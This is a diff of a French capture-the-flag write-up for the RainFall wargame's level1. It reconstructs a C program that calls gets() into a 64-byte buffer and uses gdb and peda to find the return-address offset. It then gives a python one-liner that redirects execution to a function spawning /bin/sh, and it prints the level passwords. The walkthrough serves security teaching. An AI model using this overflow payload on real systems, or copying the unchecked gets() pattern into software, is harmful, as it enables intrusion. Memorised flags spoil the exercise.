@@ -2,103 +2,160 @@
 
 pass : `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`
 
-```bash
-level0@RainFall:~$ su level1
-Password: 1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
+## Source :
+
+```c
+#include <stdio.h>
+
+void main() {  // 0x08048480
+	char string[64];  // esp+0x10 - size = 0x50-0x10
+	gets(string);
+}
+
+void run() {  // 0x08048444
+	fwrite("Good... Wait what?\n", 1, 19, stdout);
+	system("/bin/sh");
+}
 ```
 
 ## Recherche :
 
-```bash
-level1@RainFall:~$ ls -la
-total 17
-dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
-dr-x--x--x  1 root   root    340 Sep 23  2015 ..
--rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
--rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
--rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
--rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
--rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+On voit que si on lui envoi une chaine très longue, le programme segfault.
+
+```sh
+(gdb) r < <(python -c 'print "A"*100')
+Starting program: /home/user/level1/level1 < <(python -c 'print "A"*100')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
 ```
 
-```nasm
-(gdb) disas main
-Dump of assembler code for function main:
-   0x08048480 <+0>:	push   %ebp
-   0x08048481 <+1>:	mov    %esp,%ebp
-   0x08048483 <+3>:	and    $0xfffffff0,%esp
-   0x08048486 <+6>:	sub    $0x50,%esp
-   0x08048489 <+9>:	lea    0x10(%esp),%eax
-   0x0804848d <+13>:	mov    %eax,(%esp)
-   0x08048490 <+16>:	call   0x8048340 <gets@plt>
-   0x08048495 <+21>:	leave
-   0x08048496 <+22>:	ret
-End of assembler dump.
+Aussi on peut observer que le programme à planter car il a essayé d'aller executer l'adresse `0x41414141`, qui est "AAAA".
+
+Pour faire ceci, c'est qu'on a réécrit dans le registre `EIP` qui indique où sera exécuté la prochaine partie du code.
+
+Avec ces images, on comprends mieux comment ceci s'est passé :
+
+![](https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png)
+
+![](https://camo.githubusercontent.com/3862e2874666eb632fad1ab3f16b420b3c558344/68747470733a2f2f692e696d6775722e636f6d2f527868674459762e706e67) 
+
+On va donc chercher à partir de quel caractère on écrit sur l'`EIP`
+
+```sh
+(gdb) r < <(python -c 'print "A"*64 + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level1/level1 < <(python -c 'print "A"*64 + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x46454443 in ?? ()
 ```
 
+On voit `0x46454443`, soit "CDEF", on a donc réécrit à partir du 64 + 10 + 2 = 76<sup>ème</sup> caractère.
 
-```nasm
-level1@RainFall:~$ objdump -d ./level1
-..
-08048444 <run>:
- 8048444:	55                   	push   %ebp
- 8048445:	89 e5                	mov    %esp,%ebp
- 8048447:	83 ec 18             	sub    $0x18,%esp
- 804844a:	a1 c0 97 04 08       	mov    0x80497c0,%eax
- 804844f:	89 c2                	mov    %eax,%edx
- 8048451:	b8 70 85 04 08       	mov    $0x8048570,%eax
- 8048456:	89 54 24 0c          	mov    %edx,0xc(%esp)
- 804845a:	c7 44 24 08 13 00 00 	movl   $0x13,0x8(%esp)
- 8048461:	00
- 8048462:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
- 8048469:	00
- 804846a:	89 04 24             	mov    %eax,(%esp)
- 804846d:	e8 de fe ff ff       	call   8048350 <fwrite@plt>
- 8048472:	c7 04 24 84 85 04 08 	movl   $0x8048584,(%esp)
- 8048479:	e8 e2 fe ff ff       	call   8048360 <system@plt>
- 804847e:	c9                   	leave
- 804847f:	c3                   	ret
+#### PEDA USAGE
 
-08048480 <main>:
- 8048480:	55                   	push   %ebp
- 8048481:	89 e5                	mov    %esp,%ebp
- 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
- 8048486:	83 ec 50             	sub    $0x50,%esp
- 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
- 804848d:	89 04 24             	mov    %eax,(%esp)
- 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
- 8048495:	c9                   	leave
- 8048496:	c3                   	ret
- 8048497:	90                   	nop
- 8048498:	90                   	nop
- 8048499:	90                   	nop
- 804849a:	90                   	nop
- 804849b:	90                   	nop
- 804849c:	90                   	nop
- 804849d:	90                   	nop
- 804849e:	90                   	nop
- 804849f:	90                   	nop
-..
+> Pour trouver ceci de manière plus rapide, il existe un outil de `peda` : `pattern` qui permet de créer des patterns et de les rechercher par la suite.
+> - `pattern create <size>` pour la creation de pattern
+> - `pattern search` pour retrouver la pattern
+
+```sh
+gdb-peda$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb-peda$ r < <(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
+Starting program: /home/kali/rainfall/level1 < <(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]                                                                    
+EAX: 0xbffff230 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
+EBX: 0x0 
+ECX: 0xb7fb7580 --> 0xfbad2088 
+EDX: 0xbffff294 --> 0x0 
+ESI: 0xb7fb7000 --> 0x1dfd6c 
+EDI: 0xb7fb7000 --> 0x1dfd6c 
+EBP: 0x65414149 ('IAAe')
+ESP: 0xbffff280 ("AJAAfAA5AAKAAgAA6AAL")
+EIP: 0x41344141 ('AA4A')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)                                                                   
+[-------------------------------------code-------------------------------------]                                                                    
+Invalid $PC address: 0x41344141
+[------------------------------------stack-------------------------------------]                                                                    
+0000| 0xbffff280 ("AJAAfAA5AAKAAgAA6AAL")
+0004| 0xbffff284 ("fAA5AAKAAgAA6AAL")
+0008| 0xbffff288 ("AAKAAgAA6AAL")
+0012| 0xbffff28c ("AgAA6AAL")
+0016| 0xbffff290 ("6AAL")
+0020| 0xbffff294 --> 0x0 
+0024| 0xbffff298 --> 0xb7fb7000 --> 0x1dfd6c 
+0028| 0xbffff29c --> 0x0 
+[------------------------------------------------------------------------------]                                                                    
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41344141 in ?? ()
+gdb-peda$ pattern search
+Registers contain pattern buffer:
+EBP+0 found at offset: 72
+EIP+0 found at offset: 76
+Registers point to pattern buffer:
+[EAX] --> offset 0 - size ~100
+[ESP] --> offset 80 - size ~20
+Pattern buffer found at:
+0x0804a1a0 : offset    0 - size  100 ([heap])
+0xbffff230 : offset    0 - size  100 ($sp + -0x50 [-20 dwords])
+References to pattern buffer found at:
+0xb7fb758c : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
+0xb7fb7590 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
+0xb7fb7594 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
+0xb7fb7598 : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
+0xb7fb759c : 0x0804a1a0 (/usr/lib/i386-linux-gnu/libc-2.30.so)
+0xbffff0a4 : 0x0804a1a0 ($sp + -0x1dc [-119 dwords])
+0xbffff148 : 0x0804a1a0 ($sp + -0x138 [-78 dwords])
+0xbffff220 : 0xbffff230 ($sp + -0x60 [-24 dwords])
 ```
 
+Où l'on retrouve bien le même résultat : `EIP+0 found at offset: 76`
+
+```sh
+(gdb) r < <(python -c 'print "\x90"*76+"ABCD"')
+Starting program: /home/user/level1/level1 < <(python -c 'print "\x90"*76+"ABCD"')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x44434241 in ?? ()
 ```
-(gdb) printf "%s", 0x8048570
+
+On est bon, on doit juste remplacer "ABCD" par l'adresse de `run`. Aussi on remarque que l'adresse est inversée. C'est normal, on est en little endian.
+
+Pour tester, on va mettre un breakpoint à la fonction `run`, et essayer d'accéder à l'adresse `0x804844a` :
+
+```sh
+(gdb) b run
+Breakpoint 1 at 0x804844a
+(gdb) r < <(python -c 'print "\x90"*76+"\x4a\x84\x04\x08"')
+Starting program: /home/user/level1/level1 < <(python -c 'print "\x90"*76+"\x4a\x84\x04\x08"')
+
+Breakpoint 1, 0x0804844a in run ()
+(gdb) c
+Continuing.
 Good... Wait what?
-(gdb) printf "%s", 0x8048584
-/bin/sh
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0804847e in run ()
 ```
+
+On est bon ! Il reste plus qu'à passer à l'exploit.
 
 ## Exploit :
 
-```bash
-level1@RainFall:~$ echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo -ne "\x44\x84\x04\x08") > /tmp/l1
-level1@RainFall:~$ cat /tmp/l1  - | ./level1
+```sh
+level1@RainFall:~$ (python -c 'print "\x90"*76+"\x4a\x84\x04\x08"'; cat) | ./level1 
 Good... Wait what?
-pwd
-/home/user/level1
-cat /home/user/level2/.pass
+whoami
+level2
+cd ../level2
+cat .pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-Segmentation fault (core dumped)
 ```
 
 ----
@@ -107,3 +164,4 @@ Segmentation fault (core dumped)
 
 * [buffer-overflow-code](https://reverseengineering.stackexchange.com/questions/2995/illegal-instruction-exploiting-sample-buffer-overflow-code)
 * [tutorial Exploit Stack Based Overflows](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
+* [Comment passer les arguments au programme ?](https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection/13929#13929)
